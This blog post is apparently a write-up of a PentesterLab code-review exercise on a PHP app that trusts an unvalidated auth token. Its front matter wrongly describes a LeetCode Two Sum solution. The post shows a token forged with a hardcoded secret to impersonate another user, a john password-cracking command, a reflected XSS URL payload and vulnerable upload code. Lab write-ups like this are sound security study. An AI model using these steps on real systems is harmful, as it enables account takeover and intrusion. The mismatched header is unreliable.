---
title: "PentesterLab: Introduction To Code Review"
description: "Solving the classic Two Sum leetcode problem in Python, exploring various strategies."
authors: ["Akreed"]
tags: ["hash-function", "cryptography", "data-integrity", "python", "security"]
pubDate: "06 Sep 2025"
image: "/Ad-Astra/posts/leetcode-1-two-sum.png"
---

The big main flaw in this system seems to be that the jwt that the user provides to authenticate is not validated in any way. The information contained in this token is used for multiple things, always without validation, which leads to multiple vulnerabilities.

My valid auth token auth=eyJhbGciOiJIUzI1NiIsImlhdCI6MTc1OTk0Mjg2M30.eyJ1c2VybmFtZSI6InRlc3QiLH0%3D.3d7db57e0be6496829546dbe54e6db7ab3d5f299f92b66c9d43aef7b14783d79

where
- HEADER = {"alg":"HS256","iat":1759942863}
- PAYLOAD
    - eyJ1c2VybmFtZSI6InRlc3QiLH0%3D - we need to URL-decode first => eyJ1c2VybmFtZSI6InRlc3QiLH0= => {"username":"test",}

PATH TRAVERSAL

  public static function addfile($user) {
    $file = "files/".$user."/".basename($_FILES["file"]["name"]);
    if (!preg_match("/\.pdf/", $file)) {
      return  "Only PDF are allowed"; 
    } elseif (!move_uploaded_file($_FILES["file"]["tmp_name"], $file)) {
      return "Sorry, there was an error uploading your file.";
    }
    return NULL;
  }

because user is not validated an attacker could modify the jwt token to modify the username field and set it to whatever value we want. We could specify the name of another user and we would check for an IDOR. To do that we need to create a valid JWT token with the username set to the victim's username.

❯ echo -n '{"username":"akreed"}' | base64
eyJ1c2VybmFtZSI6ImFrcmVlZCJ9

This will be the malicious_payload. We need the new signature which is has the structure of `donth4ckmebr0<HEADER>.<MALICIOUS_PAYLOAD>

❯ echo -n "donth4ckmebr0eyJhbGciOiJIUzI1NiIsImlhdCI6MTc1OTk0Mjg2M30.eyJ1c2VybmFtZSI6ImFrcmVlZCJ9" | sha256sum
68bcf5296f2614b705d59f43d7eb31d4ddd733ba7df645e3a9e7924f5c191ac0

now that we have the new signature, our new jwt token will be <HEADER>.<MALICIOUS_PAYLOAD>.<NEW_SIGNATURE>, which in our case is eyJhbGciOiJIUzI1NiIsImlhdCI6MTc1OTk0Mjg2M30.eyJ1c2VybmFtZSI6ImFrcmVlZCJ9.68bcf5296f2614b705d59f43d7eb31d4ddd733ba7df645e3a9e7924f5c191ac0



Aside from the vulnerabilities related to this token

- In deploy.sql there is a hardcoded hash, most likely it is the hash for the admin user's password. If I were able to succedd with a rainbow table attack then I could know the admin's password. I tried to do so with `john --format=raw-md5 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt` but did not succeeded.

- In index.php, line 34: <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">, there is an XSS. $_SERVER['PHP_SELF'] contains the current script name and path, which can be manipulated by the user through the URL. An attacker can craft a malicious URL like: http://localhost:8080/index.php/"><script>alert('XSS')</script><" This would result in: <form action="/index.php/"><script>alert('XSS')</script><" method="post" enctype="multipart/form-data"> (I'll attach an image of the pop-up with the XSS text).

- There is no graceful way to delete your account, so the only way is to manually remove the user from the db, but if the files remain unremoved then another user can create an account with the same username as the original account and access all files.